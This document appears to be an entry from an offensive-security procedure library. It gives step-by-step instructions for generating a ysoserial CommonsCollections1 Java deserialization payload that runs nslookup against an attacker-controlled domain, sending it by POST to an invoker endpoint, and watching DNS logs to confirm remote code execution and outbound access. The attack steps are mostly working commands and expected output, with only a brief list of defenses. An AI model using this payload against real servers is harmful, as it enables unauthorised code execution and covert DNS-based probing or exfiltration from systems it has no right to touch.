---
id: p-nslookup-network-demo
tags:
  - network-exfil
  - dns
  - rce
type: procedure
tools:
  - '[[tools/ysoserial]]'
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/ysoserial-generate-commonscollections-nslookup]]'
  - '[[commands/sudo-tail-log-messages]]'
verified: false
platforms:
  - Web
  - Windows
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exfiltration Over Alternative Protocol]]'
updated_at: '2025-12-14T17:23:42.629Z'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exfiltration Over Alternative Protocol]]'
---
# Demonstrate Network Interaction with Nslookup Payload

## Summary

This procedure uses an nslookup command in a ysoserial payload to confirm outbound network access from the compromised server, observable via DNS logs on a controlled domain.

## Description

By executing 'nslookup mealstest.demonsec.us', the payload triggers a DNS query from the target server to the attacker's DNS server, bypassing potential shell egress filters. This proves RCE with network capabilities.

## Requirements

1. Control over a DNS server (e.g., BIND) logging queries
2. Ysoserial and Burp Suite setup
3. Public domain for DNS resolution

## Defense

Defensive measures and detection strategies:

- Egress filtering on DNS to whitelisted resolvers only
- Monitor for anomalous DNS queries from application servers
- IDS rules for DNS tunneling or exfil patterns

## Objectives

1. Trigger outbound DNS from target
2. Confirm via external logs
3. Demonstrate persistence despite filtering

## Instructions

### Step 1: Generate Nslookup Payload

**Context**: Create payload for DNS interaction.

**Command** ([[commands/ysoserial-generate-commonscollections-nslookup]]):
```bash
java -jar ysoserial-0.0.4-all.jar CommonsCollections1 'nslookup mealstest.demonsec.us' > serialtest
```

> Expected: Binary file; send via POST to invoker.

### Step 2: Monitor DNS Logs

**Context**: Watch for incoming query on attacker's DNS server.

**Command** ([[commands/sudo-tail-log-messages]]):
```bash
sudo tail -f /var/log/messages
```

> Expected: Log entry showing query from target's IP, e.g., 'client <target-ip>: query: mealstest.demonsec.us IN A'.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[Exfiltration Over Alternative Protocol]] Exfiltration Over Alternative Protocol (DNS implied)

### Sub-Techniques


## Commands Used

- [[commands/ysoserial-generate-commonscollections-nslookup]]
- [[commands/sudo-tail-log-messages]]

## Tools Used

- [[tools/ysoserial]]
- [[tools/Burp-Suite]]

## Tags

- dns
- exfil
